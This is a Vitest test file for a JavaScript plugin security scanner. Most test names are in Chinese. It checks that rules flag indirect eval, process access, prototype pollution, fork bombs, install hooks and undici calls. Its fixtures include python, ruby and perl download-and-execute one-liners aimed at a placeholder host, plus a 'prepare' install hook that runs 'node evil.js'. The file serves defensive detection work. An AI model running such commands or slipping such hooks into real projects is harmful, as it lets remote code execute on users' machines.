import { describe, expect, it } from 'vitest'
import { scan } from '../lib/scanner-bin/engine.js'
import { executeRules } from '../lib/scanner-bin/rules/index.js'
import { ENGINE_VERSION } from '../lib/scanner-bin/protocol.js'
import { parseSource } from '../lib/scanner-bin/ast.js'
import { isRedosPattern } from '../lib/scanner-bin/rules/resource-safety.js'
import { runPackageJson } from '../lib/scanner-bin/rules/supply-chain.js'
import { runNonJsScript } from '../lib/scanner-bin/rules/non-js-scripts.js'
import type { Finding, ScanRequest } from '../lib/scanner-bin/protocol.js'

function codeRequest(overrides: Partial<ScanRequest> = {}): ScanRequest {
  return { kind: 'code', language: 'js', runtime: 'host', ...overrides }
}

function rulesOf(code: string, request: ScanRequest = codeRequest()): Finding[] {
  const sf = parseSource(code, 'input.js', 'js')
  return executeRules(sf, { request, runtime: request.runtime ?? 'host' })
}

function ofRule(fs: Finding[], rule: string): Finding[] {
  return fs.filter(f => f.rule === rule)
}

describe('0.1.16 加固批次——scanner 规则补丁', () => {
  it('ENGINE_VERSION 递增为 static-v13（缓存失效）', () => {
    expect(ENGINE_VERSION).toBe('static-v13')
  })

  describe('R2 间接/前缀 eval-Function', () => {
    it('globalThis.eval(x) → R2 high', () => {
      const f = ofRule(rulesOf("globalThis.eval('1+1')"), 'R2')
      expect(f.length).toBe(1)
      expect(f[0].severity).toBe('high')
      expect(f[0].message).toContain('间接 eval')
    })
    it('window.eval(x) → R2 high', () => {
      const f = ofRule(rulesOf("window.eval('1+1')"), 'R2')
      expect(f.length).toBe(1)
      expect(f[0].severity).toBe('high')
    })
    it('globalThis 元素访问形态 → R2 high', () => {
      const f = ofRule(rulesOf("globalThis['eval']('1+1')"), 'R2')
      expect(f.length).toBe(1)
      expect(f[0].severity).toBe('high')
    })
    it('逗号运算符 indirect eval → R2 high', () => {
      const f = ofRule(rulesOf("(0, eval)('1+1')"), 'R2')
      expect(f.length).toBe(1)
      expect(f[0].severity).toBe('high')
      expect(f[0].message).toContain('间接 eval')
    })
    it('逗号运算符 indirect Function → R2 high', () => {
      const f = ofRule(rulesOf("(0, Function)('return 1')"), 'R2')
      expect(f.length).toBe(1)
      expect(f[0].severity).toBe('high')
      expect(f[0].message).toContain('间接 Function')
    })
    it('负例：任意对象的方法 eval 不报（非全局前缀）', () => {
      const f = ofRule(rulesOf("obj.eval('1+1')"), 'R2')
      expect(f.filter(x => x.message.includes('间接'))).toEqual([])
    })
    it('require 拼接形态 → R2 high（files 模式）', () => {
      const f = ofRule(rulesOf("require('child' + '_process')", codeRequest({ kind: 'files', files: ['/x/a.js'] })), 'R2')
      expect(f.some(x => x.severity === 'high' && x.message.includes('child_process'))).toBe(true)
    })
  })

  describe('R3 global-process 前缀形态', () => {
    it('globalThis.process.exit(1) → R3 critical', () => {
      const f = ofRule(rulesOf('globalThis.process.exit(1)'), 'R3')
      expect(f.length).toBe(1)
      expect(f[0].severity).toBe('critical')
      expect(f[0].message).toContain('globalThis.process.exit')
    })
    it('global.process.mainModule → R3 critical', () => {
      const f = ofRule(rulesOf('global.process.mainModule'), 'R3')
      expect(f.length).toBe(1)
      expect(f[0].severity).toBe('critical')
    })
    it('globalThis.process.exit 在 SIGTERM 处理器内 → info（优雅退出）', () => {
      const f = ofRule(rulesOf("process.on('SIGTERM', () => { globalThis.process.exit(0) })"), 'R3')
      const exit = f.find(x => x.message.includes('exit'))
      expect(exit?.severity).toBe('info')
    })
    it('globalThis.process.env → info（只读能力触达面）', () => {
      const f = ofRule(rulesOf('globalThis.process.env'), 'R3')
      expect(f.length).toBe(1)
      expect(f[0].severity).toBe('info')
    })
    it('裸 global.process（无成员）→ info', () => {
      const f = ofRule(rulesOf('global.process;'), 'R3')
      expect(f[0].severity).toBe('info')
    })
    it('回归：裸 process.exit(1) 仍 critical', () => {
      const f = ofRule(rulesOf('process.exit(1)'), 'R3')
      expect(f[0].severity).toBe('critical')
    })
  })

  describe('R4 Reflect.defineProperty 原型污染', () => {
    it('Reflect.defineProperty(Object.prototype, ...) → R4', () => {
      const f = ofRule(rulesOf("Reflect.defineProperty(Object.prototype, 'polluted', { value: 1 })"), 'R4')
      expect(f.length).toBe(1)
    })
    it('回归：Object.defineProperty 仍报 R4', () => {
      const f = ofRule(rulesOf("Object.defineProperty(Object.prototype, 'x', { value: 1 })"), 'R4')
      expect(f.length).toBe(1)
    })
  })

  describe('R9 fork-bomb sync 变体 + 转义括号', () => {
    it('while(true){ execSync } → R9 fork-bomb high（此前漏检）', () => {
      const f = ofRule(rulesOf("while (true) { const cp = require('child_process'); cp.execSync('echo x') }"), 'R9')
      expect(f.some(x => x.severity === 'high')).toBe(true)
    })
    it('for(;;){ spawnSync } → R9 high', () => {
      const f = ofRule(rulesOf("for (;;) { require('child_process').spawnSync('ls') }"), 'R9')
      expect(f.some(x => x.severity === 'high')).toBe(true)
    })
    it('isRedosPattern: (a+)+ → true（回归）', () => {
      expect(isRedosPattern('(a+)+')).toBe(true)
    })
    it('isRedosPattern: (https?:)? → false（回归）', () => {
      expect(isRedosPattern('^(https?:)?//')).toBe(false)
    })
    it('isRedosPattern: 转义括号不破坏组边界判定（不抛错）', () => {
      // (a\)+ 的 ) 是字面量：组永不闭合 → 线性文本重复，非 ReDoS（旧实现会误闭合组）
      expect(isRedosPattern('(a\\)+b')).toBe(false)
      expect(isRedosPattern('(\\()')).toBe(false)
    })
  })

  describe('R10 prepare 安装钩子', () => {
    it('scripts.prepare 存在 → R10 high（此前漏检）', () => {
      const f = runPackageJson(JSON.stringify({ name: 'x', scripts: { prepare: 'node evil.js' } }), 'package.json', 'plugin')
      expect(f.some(x => x.rule === 'R10' && x.severity === 'high')).toBe(true)
    })
  })

  describe('R14 python/ruby/perl 下载即执行', () => {
    it('python3 -c urllib+exec → R14 high', () => {
      const f = runNonJsScript('python3 -c "import urllib.request as u; exec(u.urlopen(\'http://x\').read())"', 'x.sh', 'plugin')
      expect(f.length).toBe(1)
      expect(f[0].severity).toBe('high')
    })
    it('ruby -e Net::HTTP → R14 high', () => {
      const f = runNonJsScript("ruby -e 'require \"net/http\"; system(Net::HTTP.get(URI(\'http://x\')))'", 'x.sh', 'plugin')
      expect(f.length).toBe(1)
    })
    it('perl -e LWP → R14 high', () => {
      const f = runNonJsScript("perl -e 'use LWP::Simple; system(get(\'http://x\'))'", 'x.sh', 'plugin')
      expect(f.length).toBe(1)
    })
    it('负例：python3 -c 纯 print 不报', () => {
      const f = runNonJsScript('python3 -c "print(1)"', 'x.sh', 'plugin')
      expect(f).toEqual([])
    })
  })

  describe('R15 undici sink', () => {
    it('undici.request(未解析标识符) → R15（URL 按契约）', () => {
      const res = scan(codeRequest({ code: 'function go(u: string) { undici.request(u) }' }))
      expect(res.ok).toBe(true)
      const r15 = (res.report?.findings ?? []).filter(f => f.rule === 'R15')
      expect(r15.length).toBe(1)
    })
    it('undici.request(字面量) → 不报（可声明）', () => {
      const res = scan(codeRequest({ code: "undici.request('https://api.example.com')" }))
      const r15 = (res.report?.findings ?? []).filter(f => f.rule === 'R15')
      expect(r15).toEqual([])
    })
  })

  it('verdict 联动：globalThis.eval + process.exit → critical', () => {
    const res = scan(codeRequest({ code: "globalThis.eval('1'); globalThis.process.exit(1)" }))
    expect(res.ok).toBe(true)
    expect(res.report!.verdict).toBe('critical')
  })
})
